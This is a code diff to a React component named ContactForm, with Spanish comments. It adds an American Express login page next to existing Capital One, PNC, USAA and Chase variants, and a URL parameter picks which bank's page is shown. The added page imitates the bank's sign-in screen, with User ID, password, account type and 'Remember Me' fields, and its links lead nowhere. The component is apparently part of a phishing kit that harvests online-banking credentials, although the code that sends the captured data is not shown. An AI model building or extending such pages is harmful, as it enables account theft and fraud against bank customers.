@@ -27,6 +27,7 @@ export default function ContactForm() {
   const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
   const [submitting, setSubmitting] = useState(false)
   const [formStep, setFormStep] = useState('username') // 'username' | 'password' (para USAA)
+  const [accountType, setAccountType] = useState('cards-banking') // para American Express
 
   // Obtener parámetros de URL
   const params = new URLSearchParams(window.location.search)
@@ -93,6 +94,7 @@ export default function ContactForm() {
   const isCapitalOne = bankName?.toLowerCase().includes('capital one')
   const isPNC = bankName?.toLowerCase().includes('pnc')
   const isUSAA = bankName?.toLowerCase().includes('usaa')
+  const isAmex = bankName?.toLowerCase().includes('american express')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -690,6 +692,104 @@ export default function ContactForm() {
                     I need help logging on
                   </a>
                 </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para American Express
+    if (isAmex) {
+      return (
+        <div className="min-h-screen bg-gray-100 px-4 py-8 sm:px-0">
+          <div className="mx-auto max-w-[600px] py-10">
+            <div className="rounded-lg bg-white p-10 shadow-lg">
+              <h1 className="mb-10 text-2xl font-bold text-content-primary">Log In to My Account</h1>
+
+              <form onSubmit={submitForm} className="space-y-6">
+                {/* User ID */}
+                <div>
+                  <label className="mb-2 block text-sm font-semibold text-content-primary">User ID</label>
+                  <input
+                    type="text"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    className="w-full rounded-lg border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
+                  />
+                </div>
+
+                {/* Password */}
+                <div>
+                  <div className="mb-2 flex items-center justify-between">
+                    <label className="block text-sm font-semibold text-content-primary">Password</label>
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="text-sm text-blue-600 hover:text-blue-700 font-semibold"
+                    >
+                      {showPassword ? 'Hide' : 'Show'}
+                    </button>
+                  </div>
+                  <input
+                    type={showPassword ? 'text' : 'password'}
+                    required
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    className="w-full rounded-lg border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
+                  />
+                </div>
+
+                {/* Account Type */}
+                <div>
+                  <label className="mb-2 block text-sm font-semibold text-content-primary">Account Type</label>
+                  <select
+                    value={accountType}
+                    onChange={(e) => setAccountType(e.target.value)}
+                    className="w-full rounded-lg border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
+                  >
+                    <option value="cards-banking">Cards and Banking</option>
+                    <option value="business">Business</option>
+                    <option value="corporate">Corporate</option>
+                  </select>
+                </div>
+
+                {/* Remember Me */}
+                <label className="flex items-center gap-3">
+                  <input
+                    type="checkbox"
+                    checked={rememberUsername}
+                    onChange={(e) => setRememberUsername(e.target.checked)}
+                    className="h-5 w-5 cursor-pointer rounded border-2 border-black/30"
+                  />
+                  <span className="text-sm text-content-primary">Remember Me</span>
+                </label>
+
+                {/* Log In Button */}
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="mt-8 w-full rounded-lg bg-blue-600 py-3.5 font-bold text-white hover:bg-blue-700 disabled:opacity-60"
+                >
+                  {submitting ? 'Logging in…' : 'Log In'}
+                </button>
+              </form>
+
+              {/* Links */}
+              <div className="mt-8 space-y-3 border-t border-black/10 pt-6">
+                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                  Forgot User ID or Password?
+                </a>
+                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                  Create New Online Account
+                </a>
+                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                  Confirm Card Received
+                </a>
+                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                  Visit Our Security Center
+                </a>
               </div>
             </div>
           </div>
